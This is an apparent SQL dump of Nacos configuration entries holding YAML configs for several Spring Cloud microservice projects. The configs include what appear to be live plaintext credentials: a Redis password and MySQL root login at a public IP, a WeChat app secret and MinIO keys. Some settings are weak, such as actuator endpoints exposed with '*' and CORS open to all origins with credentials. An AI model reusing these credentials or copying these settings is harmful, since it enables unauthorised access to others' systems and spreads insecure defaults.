INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (165, 'gitegg-cloud-config-xxl-job.yaml', 'GITEGG_CLOUD', 'server:
  servlet:
    context-path: /xxl-job-admin
spring:
  cloud:
    nacos:
      discovery:
        metadata:
          management:
            context-path: ${server.servlet.context-path}/actuator
          # 启用SpringBootAdmin时 客户端端点信息的安全认证信息
          user.name: admin
          user.password: 123456
  datasource:
    url: jdbc:mysql://127.0.0.1/xxl_job?useSSL=false&zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=utf8&allowMultiQueries=true&serverTimezone=GMT%2B8
    username: root
    password: root
    driver-class-name: com.mysql.cj.jdbc.Driver
    ### datasource-pool
    type: com.zaxxer.hikari.HikariDataSource
    hikari:
      minimum-idle: 10
      maximum-pool-size: 30
      auto-commit: true
      idle-timeout: 30000
      pool-name: HikariCP
      max-lifetime: 900000
      connection-timeout: 10000
      connection-test-query: SELECT 1
      validation-timeout: 1000
  ### email
  mail:
    host: smtp.qq.com
    port: 25
    username: xxx@qq.com
    from: xxx@qq.com
    password: xxx
    properties:
      mail:
        smtp:
          auth: true
          starttls:
            enable: true
            required: true
          socketFactory:
            class: javax.net.ssl.SSLSocketFactory
### xxl-job, access token
xxl:
  job:
    accessToken: default_token
    ### xxl-job, i18n (default is zh_CN, and you can choose "zh_CN", "zh_TC" and "en")
    i18n: zh_CN
    ## xxl-job, triggerpool max size
    triggerpool: 
      fast: 
        max: 200
      slow:
        max: 100
    ### xxl-job, log retention days
    logretentiondays: 30', 'a7d3c9ca2b0ea3bc72eabec346c9cb84', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (166, 'gitegg-cloud-config-workflow.yaml', 'GITEGG_CLOUD', 'spring:
  datasource:
    dynamic:
      primary: workflow
flowable:
  #关闭定时任务JOB
  async-executor-activate: false
  #  将databaseSchemaUpdate设置为true。当Flowable发现库与数据库表结构不一致时，会自动将数据库表结构升级至新版本。
  database-schema-update: false
  idm:
    enabled: false', 'e98f8bac9fb4510c1b6044f031e3db95', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (167, 'gitegg-cloud-config-admin-monitor.yaml', 'GITEGG_CLOUD', 'spring:
  boot:
    admin:
      ui:
        brand: <img src="http://img.gitegg.com/cloud/docs/images/logo.png"><span>GitEgg微服务监控系统</span>
        title: GitEgg微服务监控系统
        favicon: http://img.gitegg.com/cloud/docs/images/logo.png
        public-url: http://127.0.0.1:80/gitegg-admin-monitor/monitor
      context-path: /monitor', '2fc302d6c47811806f3bea387e6b89a5', '2024-08-07 10:36:56', '2024-08-07 10:36:56', null, '119.34.164.140', '', '98032a7a-cc91-4955-83cd-ba9ae12ad88b', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (169, 'cms-common-mysql-dev.yaml', '配置中心文件', 'spring:
  # 配置MySQL服务器
  datasource:
    # MySQL服务器数据库连接地址
    url: jdbc:mysql://localhost:3306/dt_cloud_cms?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&useSSL=false&nullCatalogMeansCurrent=true
    # MySQL服务器连接账号
    username: root
    # MySQL服务器连接密码
    password: root
    # MySQL服务器连接驱动
    driver-class-name: com.mysql.cj.jdbc.Driver
    # MySQL服务器连接池类型
    type: com.alibaba.druid.pool.DruidDataSource', '7da8d9da877ea0b06640ee1d26d4056b', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (170, 'cms-common-mongodb-dev.yaml', '配置中心文件', 'spring:
  # 配置Mongodb服务器
  data:
    mongodb:
      uri: mongodb://账号:账号@主机IP:27017/库名称', '852aa1f152e61ff42aed99d3b053c774', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (172, 'cms-service-document-dev.yaml', '配置中心文件', 'server:
  port: 8085
spring:
  application:
    name: cms-service-document
# MyBatis-Plus配置
mybatis-plus:
  typeAliasesPackage: com.cms.document.entity
  mapper-locations: classpath*:com/cms/document/mapper/**/*.xml
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl', 'de10d9b7337119193d8b84c66b552cd1', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (173, 'cms-common-rabbitmq-dev.yaml', '配置中心文件', 'spring:
  # 配置RabbitMQ服务器>>>>>>单机配置
  rabbitmq:
    host: xxx
    port: 5672
    username: xxx
    password: xxx
    virtual-host: /
    listener: #开启消费者确认机制
      simple:
        # 每次从RabbitMQ获取的消息数量
        prefetch: 1
        default-requeue-rejected: false
        # 每个队列启动的消费者数量
        concurrency: 1
        # 每个队列最大的消费者数量
        max-concurrency: 1
        # 签收模式为手动签收-那么需要在代码中手动ACK，消息确认方式，其有三种配置方式，分别是none、manual(手动ack) 和auto(自动ack) 默认auto
        acknowledge-mode: manual
        retry:
          enabled: true # 消费者是否支持重试
          max-attempts: 3 #重试最大次数
          max-interval: 3000ms #最大重试间隔时间
          initial-interval: 2000ms #重试间隔时间
    # 配置RabbitMQ服务器>>>>>>集群配置
  #  rabbitmq:
  #    addresses: localhost:5671,localhost:5672,localhost:5673
  #    username: guest
  #    password: guest
  #    virtual-host: /
  #    listener: #开启消费者确认机制
  #      simple:
  #        # 每次从RabbitMQ获取的消息数量
  #        prefetch: 1
  #        default-requeue-rejected: false
  #        # 每个队列启动的消费者数量
  #        concurrency: 1
  #        # 每个队列最大的消费者数量
  #        max-concurrency: 1
  #        # 签收模式为手动签收-那么需要在代码中手动ACK，消息确认方式，其有三种配置方式，分别是none、manual(手动ack) 和auto(自动ack) 默认auto
  #        acknowledge-mode: manual
  #        retry:
  #          enabled: true # 消费者是否支持重试
  #          max-attempts: 3 #重试最大次数
  #          max-interval: 3000ms #最大重试间隔时间
  #          initial-interval: 2000ms #重试间隔时间', '7399b7c9fd4e9653768fc10551cc808d', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (174, 'cms-service-job-dev.yaml', '配置中心文件', 'server:
  port: 8084
spring:
  application:
    name: cms-service-job
# MyBatis-Plus配置
mybatis-plus:
  typeAliasesPackage: com.cms.job.entity
  mapper-locations: classpath*:com/cms/job/mapper/**/*.xml
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl', '7dea4975b2a2abf24a97f7c921c6c52f', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (175, 'cms-service-auth-dev.yaml', '配置中心文件', '
secure:
  ignored:
    urls: # 安全路径白名单
      - /doc.html
      - /swagger-resources/**
      - /webjars/**
      - /*/api-docs
      - /css/**
      - /js/**
      - /img/**
      - /fonts/**
      - /index.html
      - /actuator/**
      - /druid/**
      - /oauth/**
      - /security/logout/**
      - /anonymous/valid_code/**
      - /anonymous/generate_id/**
      - /login.html
      - /favicon.ico

', '6dba9b3a1fe90cfc07fd99851e365bd3', '2024-08-10 12:21:26', '2024-08-10 13:04:43', 'nacos', '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (176, 'cms-service-gateway-dev.yaml', '配置中心文件', '
spring:
  cloud:
    # 网关配置
    gateway:
      globalcors:
        cors-configurations:
          \'[/**]\':
            allow-credentials: true
            allowed-origins: "*"
            allowed-headers: "*"
            allowed-methods:
              - POST
              - GET
              - PUT
              - OPTIONS
              - DELETE
              - PATCH
            max-age: 3600
      routes:
        - id: cms-service-auth
          uri: lb://cms-service-auth
          predicates:
            - Path=/auth/oauth/**,/auth/anonymous/**,/auth/security/**,/auth/hello,/auth/admin
          filters:
            - StripPrefix=1
        - id: cms-service-manage
          uri: lb://cms-service-manage
          predicates:
            - Path=/manage/api/**
          filters:
            - StripPrefix=2
        - id: cms-service-job
          uri: lb://cms-service-job
          predicates:
            - Path=/task/api/**
          filters:
            - StripPrefix=2
        - id: cms-service-document
          uri: lb://cms-service-document
          predicates:
            - Path=/doc/api/**
          filters:
            - StripPrefix=2
secure:  #配置白名单路径
  ignore:
    urls:
      - /auth/oauth/**
      - /auth/anonymous/**
', '261cfb479cc002ab52eb98df0a1b0dec', '2024-08-10 12:21:26', '2024-08-10 12:52:53', 'nacos', '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (177, 'cms-common-redis-dev.yaml', '配置中心文件', 'spring:
  # 配置Redis服务器
  redis:
    # Redis服务器连接IP
    host: 39.98.125.88
    # Redis服务器连接端口
    port: 6379
    # Redis服务器连接密码（默认为空）
    password: wW257007
    # 连接超时时间（毫秒）
    timeout: 5000
    jedis:
      pool:
        # 连接池最大连接数（使用负值表示没有限制） 默认 8
        max-active: 16
        # 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1
        max-wait: -1
        # 连接池中的最大空闲连接 默认 8
        max-idle: 16
        # 连接池中的最小空闲连接 默认 0
        min-idle: 16', 'bd6f098007a1900e005487afed363296', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (178, 'cms-common-nacos-dev.yaml', '配置中心文件', 'spring:
  # 配置jackson时间
  jackson:
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8
  # 配置Nacos
  cloud:
    nacos:
      discovery:
        # Nacos服务注册地址
        server-addr: 39.98.125.88:8848
        # 是否开启Nacos注册
        enabled: true

# OpenFeign远程调用配置
# feign:
#   sentinel:
#     enabled: true
#   httpclient:
#     enabled: false            # 关闭httpclient
#   okhttp:
#     enabled: true             # 开启okhttp
#   client:                     # openfeign远程访问的默认超时时间是1s，可以使用如下配置方式修改，也可以使人ribbon方式配置
#     config:
#       default:                # OpenFeign默认调用所有服务的默认超时时间,如果针对某个服务配置，可将default换成服务名称即可
#         connectTimeout: 5000  # 建立连接所用的时间，适用于网络状况正常的情况下，两端连接所需要的时间
#         readTimeout: 5000     # 指建立连接后从服务端读取到可用资源所用的时间,默认为1s


#ribbon:                      #设置feign客户端超时时间(OpenFeign默认支持ribbon)
#  ReadTimeout: 2000
#  ConnectTimeout: 2000

# 配置服务健康检查
management:
  endpoints:
    web:
      exposure:
        include: \'*\'', '6c8d039f655286438cf070a401f33289', '2024-08-10 12:21:26', '2024-08-10 14:02:34', 'nacos', '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (179, 'cms-common-quartz-dev.yaml', '配置中心文件', 'spring:
  # Quartz定时任务配置
  quartz:
    job-store-type: jdbc  # 将任务持久化到数据库
    wait-for-jobs-to-complete-on-shutdown: true # 程序结束时会等待quartz相关的内容结束
    overwrite-existing-jobs: true  # 可以覆盖已有的任务
    properties:
      org:
        quartz:
          scheduler: # scheduler相关
            instanceName: scheduler # 调度器实例名称
            instanceId: AUTO        # 调度器实例ID自动生成
          jobStore: # 持久化相关
            class: org.quartz.impl.jdbcjobstore.JobStoreTX                   # 调度信息存储处理类
            driverDelegateClass: org.quartz.impl.jdbcjobstore.StdJDBCDelegate # 使用完全兼容JDBC的驱动
            tablePrefix: QRTZ_   # quartz相关表前缀
            useProperties: false # 不使用properties加载 使用yml配置
          threadPool: # 线程池相关
            class: org.quartz.simpl.SimpleThreadPool # 指定线程池实现类，对调度器提供固定大小的线程池
            threadCount: 10                          # 设置并发线程数量
            threadPriority: 5                        # 指定线程优先级
            threadsInheritContextClassLoaderOfInitializingThread: true
', 'c410d811c95aa6151a6c71ef8670ee4e', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (180, 'cms-service-manage-dev.yaml', '配置中心文件', 'server:
  port: 8082
spring:
  application:
    name: cms-service-manage
  # 配置本地缓存
  cache:
    type: EHCACHE
    ehcache:
      config: classpath:ehcache.xml
# MyBatis-Plus配置
mybatis-plus:
  typeAliasesPackage: com.cms.manage.entity
  mapper-locations: classpath*:com/cms/manage/mapper/**/*.xml
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl', '9161b76047021adf0ca06c434e779887', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (181, 'cms-service-minio-dev.yaml', '配置中心文件', '#Minio文件服务器配置=====================================
minio:
  client:
    url: xxx                            # MinIo 上传地址
    accessKey: xxx                      # 账号
    secretKey: xxx                      # 密码
  http:
    url: xxx                            # MinIo 公网地址', '00617e7af5feba22ca9fe60ef9179f76', '2024-08-10 12:21:26', '2024-08-10 12:21:26', null, '61.140.102.249', '', '2d4de5ca-e5a6-47f8-b414-76848d5524da', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (213, 'mall-oms.yaml', 'DEFAULT_GROUP', 'spring:
  datasource: 
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://${mysql.host}:${mysql.port}/mall_oms?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoReconnect=true
    username: ${mysql.username}
    password: ${mysql.password}
  # RabbitMQ 配置
  rabbitmq:
    host: ${rabbitmq.host}
    port: ${rabbitmq.port}
    username: ${rabbitmq.username}
    password: ${rabbitmq.password}
    virtual-host: /
    listener:
      simple:
        acknowledge-mode: manual   
  redis:
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        min-idle: 1
mybatis-plus:
  configuration:
    # 驼峰下划线转换
    map-underscore-to-camel-case: true
    # 这个配置会将执行的sql打印出来，在开发或测试的时候可以用
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl

# 分布式锁配置
redisson:
  address: redis://${redis.host}:${redis.port}
  password: ${redis.password}
  database: 0
  min-idle: 2

# Seata配置
seata:
  enabled: true
  # 事务分组配置
  tx-service-group: mall_tx_group
  # 指定事务分组至集群映射关系，集群名default需要与seata server注册到Nacos的cluster保持一致
  service:
    vgroup-mapping:
      mall_tx_group: default 
  registry:
    type: nacos
    nacos:
      application: seata-server
      server-addr: ${seata.nacos.server-addr}
      namespace:
      group: SEATA_GROUP
      
# Feign 配置
feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false

security:
  ignoreUrls:
      - /webjars/**
      - /doc.html
      - /swagger-resources/**
      - /v2/api-docs
      - /app-api/v1/carts', '1510aa9bcf0494ad2dc61bca402a948e', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (214, 'mall-pms.yaml', 'DEFAULT_GROUP', 'spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://${mysql.host}:${mysql.port}/mall_pms?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoReconnect=true
    username: ${mysql.username}
    password: ${mysql.password}
  redis:
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        min-idle: 1
  # RabbitMQ 配置
  rabbitmq:
    host: ${rabbitmq.host}
    port: ${rabbitmq.port}
    username: ${rabbitmq.username}
    password: ${rabbitmq.password}
    virtual-host: /        
  elasticsearch:
    rest:
      uris: ["http://d.youlai.tech:9200"]
      cluster-nodes:
        - d.youlai.tech:9200
  cache:
    # 缓存类型
    type: redis
    # 缓存时间(单位：ms)
    redis:
      time-to-live: 3600000
      # 缓存null值，防止缓存穿透
      cache-null-values: true
      # 允许使用缓存前缀，
      use-key-prefix: true
      # 缓存前缀，没有设置使用注解的缓存名称(value)作为前缀，和注解的key用双冒号::拼接组成完整缓存key
      # key-prefix:

mybatis-plus:
  configuration:
    # 驼峰下划线转换 
    map-underscore-to-camel-case: true
    # 这个配置会将执行的sql打印出来，在开发或测试的时候可以用
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl

# 分布式锁配置
redisson:
  address: redis://${redis.host}:${redis.port}
  password: ${redis.password}
  database: 0
  min-idle: 2

# Seata配置
seata:
  enabled: true
  # 事务分组配置
  tx-service-group: mall_tx_group
  # 指定事务分组至集群映射关系，集群名default需要与seata server注册到Nacos的cluster保持一致
  service:
    vgroup-mapping:
      mall_tx_group: default 
  registry:
    type: nacos
    nacos:
      application: seata-server
      server-addr: ${seata.nacos.server-addr}
      namespace:
      group: SEATA_GROUP

# feign 配置
feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false 

security:
  ignoreUrls:
      - /webjars/**
      - /doc.html
      - /swagger-resources/**
      - /v2/api-docs
      - /app-api/v1/categories
      - /app-api/v1/spu/**', '7ec965e5dc429dd48088d27b9dcc7ca6', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (215, 'mall-sms.yaml', 'DEFAULT_GROUP', 'spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://${mysql.host}:${mysql.port}/mall_sms?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoReconnect=true
    username: ${mysql.username}
    password: ${mysql.password}
  redis:
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        min-idle: 1
mybatis-plus:
  type-enums-package: com.youlai.mall.sms.common.enums
  configuration:
    # 驼峰下划线转换
    map-underscore-to-camel-case: true
    # 这个配置会将执行的sql打印出来，在开发或测试的时候可以用
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl

# 分布式锁配置
redisson:
  address: redis://${redis.host}:${redis.port}
  password: ${redis.password}
  database: 0
  min-idle: 2

# Ribbon 配置
ribbon:
  ReadTimeout: 120000
  ConnectTimeout: 10000
  SocketTimeout: 10000
  MaxAutoRetries: 0
  MaxAutoRetriesNextServer: 1

# Feign 配置
feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false 

security:
  ignoreUrls:
      - /webjars/**
      - /doc.html
      - /swagger-resources/**
      - /v2/api-docs
      - /app-api/v1/adverts/**', '3059b0cf06da9ad135dc0f2ce41ad101', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (216, 'mall-ums.yaml', 'DEFAULT_GROUP', 'spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://${mysql.host}:${mysql.port}/mall_ums?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoReconnect=true
    username: ${mysql.username}
    password: ${mysql.password}
  redis:
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        min-idle: 1

mybatis-plus:
  configuration:
    # 驼峰下划线转换
    map-underscore-to-camel-case: true
    # 这个配置会将执行的sql打印出来，在开发或测试的时候可以用
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl

# 分布式锁配置
redisson:
  address: redis://${redis.host}:${redis.port}
  password: ${redis.password}
  database: 0
  min-idle: 2

# Seata配置
seata:
  enabled: true
  # 事务分组配置
  tx-service-group: mall_tx_group
  # 指定事务分组至集群映射关系，集群名default需要与seata server注册到Nacos的cluster保持一致
  service:
    vgroup-mapping:
      mall_tx_group: default 
  registry:
    type: nacos
    nacos:
      application: seata-server
      server-addr: ${seata.nacos.server-addr}
      namespace:
      group: SEATA_GROUP

# Feign 配置
feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false

security:
  ignoreUrls:
      - /webjars/**
      - /doc.html
      - /swagger-resources/**
      - /v2/api-docs
      - /app-api/v1/members/openid/{openid}
      - /app-api/v1/members/mobile/{mobile}
      - /app-api/v1/members', '01d88935bfa5293d60086644237b8447', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (217, 'youlai-auth.yaml', 'DEFAULT_GROUP', 'spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver 
    url: jdbc:mysql://${mysql.host}:${mysql.port}/oauth2?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoReconnect=true
    username: ${mysql.username}
    password: ${mysql.password}
  redis:
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        min-idle: 1
  elasticsearch:
    rest:
      uris: ["http://g.youlai.tech:9200"]
      cluster-nodes:
        - g.youlai.tech:9200
  cloud:
    sentinel:
      enabled: false
      eager: true # 取消控制台懒加载，项目启动即连接Sentinel
      transport:
        client-ip: localhost
        dashboard: localhost:8080
      datasource:
        # 降级规则
        degrade:
          nacos:
            server-addr: ${spring.cloud.nacos.discovery.server-addr}
            dataId: ${spring.application.name}-degrade-rules
            groupId: SENTINEL_GROUP
            data-type: json
            rule-type: degrade  
  cache:
    # 缓存类型 redis、none(不使用缓存) 
    type: redis
    # 缓存时间(单位：ms)
    redis:
      time-to-live: 3600000
      # 缓存null值，防止缓存穿透
      cache-null-values: true
      # 允许使用缓存前缀，
      use-key-prefix: true
      # 缓存前缀，没有设置使用注解的缓存名称(value)作为前缀，和注解的key用双冒号::拼接组成完整缓存key
      key-prefix: \'auth:\'  
 
feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false 

wechat:
  weapp:
    appid: wx99a151dc43d2637b
    secret: a09605af8ad29ca5d18ff31c19828f37

# 阿里云短信配置
aliyun:
  sms:
    accessKeyId: LTAI5tSMgfxxxxxxdiBJLyR
    accessKeySecret: SoOWRqpjtS7xxxxxxZ2PZiMTJOVC
    domain: dysmsapi.aliyuncs.com 
    regionId: cn-shanghai
    templateCode: SMS_22xxx770
    signName: 有来技术

security:
  ignoreUrls:
      - /webjars/**
      - /doc.html
      - /swagger-resources/**
      - /v2/api-docs
      - /oauth/**
      - /rsa/publicKey
      - /sms-code', '9516ad3a78803fed64130344424757e4', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (218, 'youlai-common.yaml', 'DEFAULT_GROUP', '
redis:
  host: 39.98.125.88
  port: 6379
  password: wW257007
  
mysql:
  host: 39.98.125.88
  port: 3306
  username: root
  password: root

rabbitmq:
  host: root
  port: 5672
  username: guest
  password: guest

# Knife4j的认证路径
knife4j:
  password_token_url: http://localhost:9999/youlai-auth/oauth/token

# MinIO 分布式文件系统
minio:
  endpoint: http://www.youlai.tech:9000
  access-key: minioadmin
  secret-key: youlaitech
  bucket-name: default
  # 自定义域名(非必须)，Nginx配置反向代理转发文件路径
  custom-domain: https://oss.youlai.tech
  
# Seata的注册和配置中心
seata:
  nacos: 
    server-addr: http://39.98.125.88:8848
  
# Sentinel
sentinel:
  dashboard: localhost:8858

spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          jwk-set-uri: http://localhost:9999/youlai-auth/rsa/publicKey


', '9dfc1f488d9dc6a27df898e97d837dfd', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (219, 'youlai-gateway.yaml', 'DEFAULT_GROUP', 'spring:
  redis:
    timeout: PT30S
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        # 连接池最小空闲连接数
        min-idle: 1
  cloud:
    gateway:
      discovery:
        locator:
          enabled: true # 启用服务发现
          lower-case-service-id: true
      routes:
        - id: 认证中心
          uri: lb://youlai-auth
          predicates:
            - Path=/youlai-auth/**
          filters:
            - StripPrefix=1
        - id: 系统服务
          uri: lb://youlai-system
          predicates:
            - Path=/youlai-system/**
          filters:
            - StripPrefix=1
            - TokenRelay
        - id: 订单服务
          uri: lb://mall-oms
          predicates:
            - Path=/mall-oms/**
          filters:
            - StripPrefix=1
            - TokenRelay
        - id: 商品服务
          uri: lb://mall-pms
          predicates:
            - Path=/mall-pms/**
          filters:
            - StripPrefix=1
            - TokenRelay
        - id: 会员服务
          uri: lb://mall-ums
          predicates:
            - Path=/mall-ums/**
          filters:
            - StripPrefix=1
            - TokenRelay
        - id: 营销服务
          uri: lb://mall-sms
          predicates:
            - Path=/mall-sms/**
          filters:
            - StripPrefix=1
            - TokenRelay
        - id: 实验室
          uri: lb://laboratory
          predicates:
            - Path=/laboratory/**
          filters:
            - StripPrefix=1
            - TokenRelay
    sentinel:
      enabled: true
      eager: true
      transport:
        dashboard: ${sentinel.dashboard}
        port: 8719 
      datasource:
        # 网关限流规则，gw-flow为key，随便定义
        gw-flow:
          nacos:
            server-addr: ${spring.cloud.nacos.discovery.server-addr}
